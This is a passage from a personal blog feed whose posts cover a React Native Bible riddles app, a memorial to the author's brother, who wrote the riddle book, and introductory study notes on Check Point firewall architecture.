                onPress={() =&amp;gt; this.props.navigation.navigate('About')}
              &amp;gt;
                &amp;lt;View style={styles.button}&amp;gt;
                  &amp;lt;Text style={styles.buttonText}&amp;gt;אודות&amp;lt;/Text&amp;gt;
                &amp;lt;/View&amp;gt;
              &amp;lt;/TouchableOpacity&amp;gt;
            &amp;lt;/View&amp;gt;
        &amp;lt;/View&amp;gt;
      &amp;lt;/Image&amp;gt;
    &amp;lt;/View&amp;gt;
    &amp;lt;/ScrollView&amp;gt;
  )
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&amp;lt;/p&amp;gt;
&lt;img src=&quot;/assets/images/app2.jpg&quot; alt=&quot;HomeScreen&quot; title=&quot;HomeScreen&quot; class=&quot;img-responsive&quot; height=&quot;500px&quot; width=&quot;400px&quot; /&gt;&lt;/p&gt;
&lt;p dir=&quot;rtl&quot;&gt;
&lt;br /&gt;
&lt;br /&gt;

&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;


&lt;br /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/app3.jpg&quot; alt=&quot;Riddle&quot; title=&quot;Riddle&quot; class=&quot;img-responsive&quot; height=&quot;500px&quot; width=&quot;400px&quot; /&gt;&lt;/p&gt;
&lt;p dir=&quot;rtl&quot;&gt;
&lt;br /&gt;

&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;


&lt;br /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/app4.jpg&quot; alt=&quot;wrong&quot; title=&quot;wrong&quot; class=&quot;img-responsive&quot; height=&quot;500px&quot; width=&quot;400px&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/app5.jpg&quot; alt=&quot;diamonds&quot; title=&quot;diamonds&quot; class=&quot;img-responsive&quot; height=&quot;500px&quot; width=&quot;400px&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/app1.jpg&quot; alt=&quot;diamonds2&quot; title=&quot;diamonds2&quot; class=&quot;img-responsive&quot; height=&quot;500px&quot; width=&quot;400px&quot; /&gt;&lt;/p&gt;</content><author><name>Guy Zwerdling</name></author><summary type="html">k, so I finished the application, now it's on Google Play, the name of the app is &quot;Habia Histom Meni Kedem&quot; of &quot;Nach Riddle&quot;</summary></entry><entry><title type="html">CheckPoint</title><link href="http://localhost:4000/2017/10/22/CheckPoint.html" rel="alternate" type="text/html" title="CheckPoint" /><published>2017-10-22T00:00:00+03:00</published><updated>2017-10-22T00:00:00+03:00</updated><id>http://localhost:4000/2017/10/22/CheckPoint</id><content type="html" xml:base="http://localhost:4000/2017/10/22/CheckPoint.html">&lt;p&gt;CheckPoint have something that called SMART Architecture, that stand for Security Mgmt. Architerctor(SMART), and that architecture contain three stuff:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;console&lt;/strong&gt; that is the PC that connect to implying and configuring the organization policy.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Managment&lt;/strong&gt; which is a box that responsible for policies and implement them on the firewalls in the network.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Gateway (FW)&lt;/strong&gt; this is the firewall that the policies apply on it, so that is the force point of the policies of the management server.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The principle in that architecture is simple, the policies will be manage on other box than the FW server, and in the FW server we only enforce that policy, no one can setup policies on the FW then the management, so keep in mine that every time we will setup some new rule we will configure it on the managment and after that we will apply it on the FW itself.&lt;/p&gt;

&lt;p&gt;If we look on the traffic control method we have three main methods that CheckPoint work with:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;packets filtering&lt;/strong&gt; which enforce the policies of the FW, which mean that only traffic that allowed on the FW to transfer, that is the only traffic that will be transfer, that mean if we have a policy that allow all traffic within the network to be transfered to the external, in that case traffic will allow to transfer in that direction only, so on body from the external will allowed to go inside to the internal, so in short packets filtering is basically said this packets are allow and this packets are doesn’t, and the default operation is deny every traffic through the firewall, that mean that if you want to allow some traffic you must set it up on the FW with the management server.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Stateful&lt;/strong&gt; which mean that if some packet from the internal travel to the external we will allow only that traffic to go back because we know that the traffic start from the internal network. It we was implement the network to work only with Packet Filtering we was in trouble because we will be must allow any traffice in any direction, so this is the place that stateful inspection come along. Every traffic will record in some state table done by INSPECT engine and if the traffic that transffer from internal and come back to the FW and it is perfect it will allow to go foreword from the external to internal which mean for example if some one from the internal sent SYN to someone else we will expect to receive some SYN+ACK from the same someone that on the external, so in some case this traffic are allow by the stateful.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;App. Awareness&lt;/strong&gt; is the way that the FW will know what is the type of the traffic which mean that the firewall know what is the application, as an example if the traffic is http, then we allow it to transfer, but if the traffic isn’t http it’s just telnet traffic that used port 80 we will disallow that, that mean the firewall knows how the application look like and base on that we can setup some rull that allow or deny some sort of traffic. So you may ask is it mean that the firewall look in every packets in digging to the application layer of that packet? so the  answer is no, the firewall allow that traffic to go along base on the first packets that arrived, if that packets contain legitimate application it will be transfer and record in the state table of INSPECT engine.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This days the operation of the checkpoint called GAiA, in the passed it was IPSO and after that it was SecurePlatform (SPLAT), the GAiA is linux base so if you know linux then you are ready to go.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Highlights&lt;/strong&gt;:
If we setup the firewall and the management in the same boxes, this implementation are called &lt;strong&gt;Standalone&lt;/strong&gt;, if the management server and the firewall server are separated, this is called &lt;strong&gt;Distributed&lt;/strong&gt; implementation.
If we setup more that one firewall in the core, in that case we can set it as High Availability. we also can use the firewall as &lt;strong&gt;Routed&lt;/strong&gt; device or as &lt;strong&gt;Bridged&lt;/strong&gt; device, this mean that if we work in Routed mode the firewall will separate broadcast domain and if we used in Bridged mode the firewall can still to look through the packet up to application layer but in that mode we doesn’t need to setup separated IP addresses for every port, which mean the firewall also doesn’t separated broadcast domains.&lt;/p&gt;

&lt;p&gt;I will setup CheckPoint firewall lab with R76 because that what I have (original disk), so for the brouser of today there is some issue  &lt;code class=&quot;highlighter-rouge&quot;&gt;ERR_SSL_VERSION_OR_CIPHER_MISMATCH&lt;/code&gt; so if you setup the machine and trying to connect them with you browser probably you will see this error, this error is related to some issue called SSL/TLS compression &lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-CVE-2012-4929&quot;&gt;CVE-2012-4929&lt;/a&gt;, so if you have some updated version of GAiA I think that you will not face with that issue, in my case I downgrade the IE browser and it work for me.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;there will be a continue.&lt;/strong&gt;&lt;/p&gt;</content><author><name>Guy Zwerdling</name></author><category term="CheckPoint" /><summary type="html">Ok... so... for guy that write how to migrate from CheckPoint to PaloAlto is difficult to write again about checkpoint, but I think that checkpoint have some good stuff that we can play with and to learn from this stuff, so this is why I write this article, first of all I want to memorize myself the knowledge I have learn for my CCSA certification and to share it with you guys.</summary></entry><entry><title type="html">Nach Riddles on Google Play!</title><link href="http://localhost:4000/2017/10/15/Finish-the-App.html" rel="alternate" type="text/html" title="Nach Riddles on Google Play!" /><published>2017-10-15T00:00:00+03:00</published><updated>2017-10-15T00:00:00+03:00</updated><id>http://localhost:4000/2017/10/15/Finish-the-App</id><content type="html" xml:base="http://localhost:4000/2017/10/15/Finish-the-App.html">&lt;p&gt;Hello everyone, We want to update that the development of the application has been successfully completed and you can download the application from Google Play&lt;/p&gt;

&lt;p&gt;ou&lt;/p&gt;
&lt;h2&gt;&lt;a href=&quot;https://zwerd.com/NachRiddles/&quot;&gt;Nach Riddles&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;As mentioned in the past, it is a riddles game built on many books from the Bible, the quiz itself high level and therefore is forced to learn the part of the riddles before trying to answer the riddles&lt;/p&gt;

&lt;p&gt;The application was developed according to David Zwerdling’s book&lt;/p&gt;</content><author><name>Guy Zwerdling</name></author><summary type="html">Hello everyone, We want to update that the development of the application has been successfully completed and you can download the application from Google Play</summary></entry><entry><title type="html">Prophet-Riddles-App-Update</title><link href="http://localhost:4000/2017/09/17/Prophet-Riddles-App-update.html" rel="alternate" type="text/html" title="Prophet-Riddles-App-Update" /><published>2017-09-17T00:00:00+03:00</published><updated>2017-09-17T00:00:00+03:00</updated><id>http://localhost:4000/2017/09/17/Prophet-Riddles-App-update</id><content type="html" xml:base="http://localhost:4000/2017/09/17/Prophet-Riddles-App-update.html">&lt;p&gt;seriously! I’ve been trying to write some script in Python for a few days and nothing! The goal is to take the source file and convert it to a CSV file I broke it on my head and finally it worked! The script takes a retouch file of the original file that is set to txt and goes over the rows and marks and builds the new file that will be ready to be converted to json And finally it happens !!!&lt;/p&gt;

&lt;p&gt;I done hard work so far, this is what I feel. After I finished the script and now after I have the json file I work hard on the App itself in react-native, so far so good, but things dosnt work I wanted so I guess there is alot of work here,&lt;/p&gt;

&lt;p&gt;Meanwhile I have some photos how the app look so far:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/riddles-HomeScreen.jpg&quot; alt=&quot;HomeScreen&quot; title=&quot;HomeScreen&quot; class=&quot;img-responsive&quot; height=&quot;500px&quot; width=&quot;400px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/riddles-Levels.jpg&quot; alt=&quot;Levels&quot; title=&quot;Levels&quot; class=&quot;img-responsive&quot; height=&quot;500px&quot; width=&quot;400px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/riddles-Riddle.jpg&quot; alt=&quot;Riddles&quot; title=&quot;Riddles&quot; class=&quot;img-responsive&quot; height=&quot;500px&quot; width=&quot;400px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So this is all for now!!&lt;/p&gt;</content><author><name>Guy Zwerdling</name></author><summary type="html">seriously! I've been trying to write some script in Python for a few days and nothing! The goal is to take the source file and convert it to a CSV file I broke it on my head and finally it worked! The script takes a retouch file of the original file that is set to txt and goes over the rows and marks and builds the new file that will be ready to be converted to json</summary></entry><entry><title type="html">Prophet-Riddles-App</title><link href="http://localhost:4000/2017/09/10/Prophet-Riddles-App.html" rel="alternate" type="text/html" title="Prophet-Riddles-App" /><published>2017-09-10T00:00:00+03:00</published><updated>2017-09-10T00:00:00+03:00</updated><id>http://localhost:4000/2017/09/10/Prophet-Riddles-App</id><content type="html" xml:base="http://localhost:4000/2017/09/10/Prophet-Riddles-App.html">&lt;p&gt;This application is about riddles on Neviim and Ktuvim which is the second and the third parts of the Bible, the original book named “אביעה חידות מני קדם” was writing by my dear brother. We working on this app day and night with huge wish to finish the first version until 5th of October of this year. I think this is the place to write a little about the author&lt;/p&gt;

&lt;p&gt;My brother was a noble soul! He loved to help everyone! To be there for them. He studied at the Kol Yaakov Yeshiva and focused on the Bible which he loved to learn very much. The idea of telling the riddles was created by him and by a friend from the yeshiva. In his introduction to this book he writes the following lines:
“ברוך שבחר בנביאים טובים, וזיכני לכתוב חידונים, שכולם בחרוזים, למען נהיה בהם בקיאים. והתחלתי לעשות זאת יען כי הרגשתי שברוך ה’ אני די בקיא בתורתו הקדושה, לדעת היכן נמצא פסוק פלוני ומי אמר למי פסוק אלמוני, אך הרגשתי שאין אני בקיא כן בנביא, ועל-כן לקחתי את הנביאים, המלמדים את קורות עם ישראל מכניסתם לארץ ועד שיבת ציון (יהושע, שופטים, שמואל, מלכים, דניאל, עזרא ונחמיה), וחלקתים ל-54 חלקים כמניין פרשיות התורה, ולכל חלק נתתי שם, כמו השמות של פרשיות התורה (כדי לזכור כל דיבור באיזו “פרשה” הוא נמצא), וסידרתי אותם מול פרשיות התורה למען אלמד בהם במשך השנה במקביל לפרשיות השבוע וכך אשלים מחזור בשמחת תורה ואתחיל מהתחלה כל שנה ואולי על-ידי כך אזכה לרכוש בקיאות בנביא, על-ידי החזרה כמו המחזור השנתי של קריאת התורה. והנה כמעט בכל שבוע מתכנסים חברֵי חדרי מישיבת “קול יעקב” המעטירה, לשמוע מפי חידון על פרשת השבוע שערך אותו הרב יהודה צימרוט בספרו “להתענג”, וחברַי מראים שליטה ובקיאות נפלאה בפרשה ולכן הוסיף לי חברי היקר הבה”ח שלמה יוסף רווח שאולי כדי שאכתוב חידונים על הנביא כמו החידונים על הפרשה, והחידונים גם יעזרו לעשות חזרה על החומר וגם לחדד את השכל בבקיאות הנביא וכך השתדלתי לעשות. החידונים ערוכים לפי הא”ב כך שכל תשובה מתחילה באות אחרת לפי סדר הא”ב, וכמעט כל תשובות הן בעצם מילים מהפסוקים עצמם. חשוב להדגיש שיש ללמוד את כל ה”פרשה” לכל הפחות עם רש”י ומצודות ואחר כך ניתן לענות על החידות בקלות. קראתי לספר אביעה חידות מני קדם על שם הפסוק בתהלים עח,ב ששם מסביר המצודה: אומר דברים סתומים שנעשו בימי קדם. תודתי נתונה לבוחר בנביאים טובים ותפילתי אליו שאזכה לדעת את דבריהם של הנביאים ולהיות בקיא בהם, וכמובן תודה להוריי שנתנו לי את האמצעיים לעסוק בתורה ולישיבה הנפלאה שבה עליתי עוד ועוד, ישיבת “קול יעקב”. תודה לרב יהודה צימרוט על ספרו הנפלא “להתענג” שכשמו כן הוא ומשם נולד הרעיון, וכן תודה לחברי היקר שהגה את הרעיון הנפלא שלמה יוסף רווח (וגם לחברֵי החדר שבאים לשמוע את חידון כמיטב המסורת של החדר). ולסיום חשוב להודות למי שהיו חברותות נהדרות בנביא, הרב חיים זוהר, והבה”ח עזרא עדס, שיזכו להמשיך ולעלות בתורה ובנביאים. דוד בן שלמה זלמן צברדלינג”&lt;/p&gt;

&lt;p&gt;On the book itself he write the folloing lins:
“‫אביעה חידות מני קדם הוא חיבור של 1188 חידות בחרוזים על ספרי נביאים ראשונים ודניאל, עזרה ונחמיה.&lt;/p&gt;

&lt;p&gt;החיבור מחלק את ספרי הנביאים ל-54 פרשיות כמניין פרשיות התורה בכדי שבכל שבוע יהיה אפשר ללמוד לצד פרשת השבוע גם חלק מהנביא ואחר כך לענות על חידון ועל ידי כך להיות בקיאים יותר בנביא.‬‬”&lt;/p&gt;

&lt;p&gt;I’m so proud of my dear brother! So love him! And very miss him! I hope that this app will indeed be compatible with his desire to create a masterpiece on the Bible.
David Zwerdling, may his memory be blessed&lt;/p&gt;</content><author><name>Guy Zwerdling</name></author><summary type="html">This application is about riddles on Neviim and Ktuvim which is the second and the third parts of the Bible, the original book named..... was writing by my dear brother</summary></entry></feed>